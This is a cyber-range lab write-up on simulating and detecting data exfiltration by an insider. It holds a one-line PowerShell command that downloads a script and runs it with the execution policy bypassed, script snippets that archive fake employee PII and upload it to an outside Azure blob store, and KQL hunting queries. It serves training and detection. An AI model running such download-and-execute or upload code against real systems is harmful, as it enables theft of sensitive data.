# Project Appendix: Simulating Data Exfiltration

This document details the technical setup used to simulate the "Data Exfiltration by a Disgruntled Employee" scenario. The core of this simulation is a single PowerShell script designed to mimic common attacker techniques.

---

### 1. The Trigger Command

The simulation was initiated on the target machine by executing a one-line command. This command downloads the main exfiltration script from a repository and immediately runs it, bypassing the local execution policy to ensure it executes.

```powershell
Invoke-WebRequest -Uri '[https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1](https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1)' -OutFile 'C:\programdata\exfiltratedata.ps1';cmd /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\exfiltratedata.ps1
```
### 2. Analysis of the exfiltratedata.ps1 Script
The script performs a multi-stage operation to collect, stage, and exfiltrate data. Below are the key snippets that illustrate its functionality.

#### Data Collection
The script begins by creating a multi-line string containing fake, but realistic, employee PII to be saved in a CSV file.

```powershell
# Create the employee data with fake information
 $employeeData = @"
$($currentDateTime)
FirstName,LastName,SSN,PhoneNumber,Salary,DOB
Travis,Ward,294-75-2745,(703)785-1895,79976.31,1984-11-10
Paul,Berry,785-68-1220,001-875-136-8234x217,66220.38,1969-02-23
```

#### Tool Staging (Downloading 7-Zip)
Next, it downloads a legitimate, portable version of the 7-Zip utility from an external server to ensure it has the tools it needs.

```powershell
# Download 7zip
try {
    Invoke-WebRequest -Uri '[https://sacyberrange00.blob.core.windows.net/vm-applications/7z2408-x64.exe](https://sacyberrange00.blob.core.windows.net/vm-applications/7z2408-x64.exe)' -OutFile 'C:\ProgramData\7z2408-x64.exe'
    Log-Message "Downloaded 7zip installer to C:\ProgramData\7z2408-x64.exe"
} catch {
    Log-Message "Error downloading 7zip: $_" "ERROR"
}
```
#### Data Archiving
It then uses the newly downloaded 7-Zip to compress the CSV file into a ZIP archive, staging it for exfiltration.

```powershell
# Use 7zip to zip the temporary CSV file
try {
    & "C:\Program Files\7-Zip\7z.exe" a $zipFilePath $tempFilePath
    Write-Host "File zipped to: $zipFilePath"
    Log-Message "Zipped file to: $zipFilePath"
} catch {
    Log-Message "Error zipping file: $_" "ERROR"
}
```
#### Exfiltration to Cloud Storage
Finally, the script constructs and executes a web request to upload the ZIP archive to an attacker-controlled Azure Blob Storage account.

```powershell
# Define Azure Blob Storage variables
$storageUrl = "[https://sacyberrangedanger.blob.core.windows.net/stolencompanydata/employee-data.zip](https://sacyberrangedanger.blob.core.windows.net/stolencompanydata/employee-data.zip)"
$storageAccount = "sacyberrangedanger"
$storageKey = "CloudAccessKey-removed-for-safety-reasons"

# ... (Signature creation logic) ...

# Upload the blob using Invoke-WebRequest
try {
    Invoke-WebRequest -Uri $storageUrl -Method Put -Headers $headers -InFile $zipFilePath -UseBasicParsing
    Log-Message "Uploaded the zip file to Azure Blob Storage: $storageUrl"
} catch {
    Log-Message "Error uploading the zip file to Azure Blob Storage: $_" "ERROR"
}
```
### 3. KQL Queries Used for Detection

Below are the KQL queries used in Microsoft Defender XDR to trace the attacker's activity from the initial script creation to the final data exfiltration.

#### Query 1: Detecting Script Creation
This query was used to find evidence of the malicious script (`exfiltratedata.ps1`) being created on the target host by the user `analyst1`.

```kql
// Query to show creation of exfiltratedata.ps1 by analyst1
DeviceFileEvents
| where DeviceName == "arguswinten" and InitiatingProcessAccountName == "analyst1"
| where Timestamp between (datetime(2025-05-08T00:00:00Z) .. datetime(2025-05-08T23:59:59Z))
| where FileName == "exfiltratedata.ps1" and ActionType == "FileCreated"
| project Timestamp, ActionType, FileName, FolderPath, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine
| sort by Timestamp asc
```
#### Query 2: Identifying Data Archiving
This query looked for the creation of the specific `.zip` file that the script was designed to create, confirming that the data collection phase of the attack was successful.

```powershell
// Query to show creation of the specific ZIP file by analyst1's script activity
DeviceFileEvents
| where DeviceName == "arguswinten" and InitiatingProcessAccountName == "analyst1" 
| where Timestamp between (datetime(2025-05-08T00:00:00Z) .. datetime(2025-05-08T23:59:59Z))
| where FileName == "employee-data-20250508185834.zip" and ActionType == "FileCreated" and InitiatingProcessFileName == "7z.exe"
| project Timestamp, ActionType, FileName, FolderPath, FileSize, InitiatingProcessAccountName, InitiatingProcessFileName
| sort by Timestamp asc
```
#### Query 3: Confirming Data Exfiltration
This final query searched for network connections initiated by the malicious script to a known suspicious domain, confirming that the archived data was successfully sent off the corporate network.

```powershell
DeviceNetworkEvents
| where DeviceName == "arguswinten" and InitiatingProcessAccountName == "analyst1"
| where Timestamp between (datetime(2025-05-08T00:00:00Z) .. datetime(2025-05-08T23:59:59Z))
| where InitiatingProcessFileName =~ "powershell.exe" and InitiatingProcessCommandLine contains "exfiltratedata.ps1"
| where RemoteUrl contains "sacyberrangedanger.blob.core.windows.net"
| project Timestamp, ActionType, LocalIP, RemoteUrl, RemoteIP, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine
| sort by Timestamp asc
```

## Created By:
- **Author Name**: Jorge Juarez
- **Code creator**: Josh Madakor https://joshmadakor.tech/
- **Author Contact**: https://www.linkedin.com/in/jorgejuarez1/
- **Date**: May 8, 2025

## Validated By:
- **Reviewer Name**: 
- **Reviewer Contact**: 
- **Validation Date**: 

---

## Additional Notes:
- **None**

---

## Revision History:
| **Version** | **Changes**                   | **Date**         | **Modified By**   |
|-------------|-------------------------------|------------------|-------------------|
| 1.0         | Initial draft                  | `July 8, 2025`  | `Jorge Juarez`   

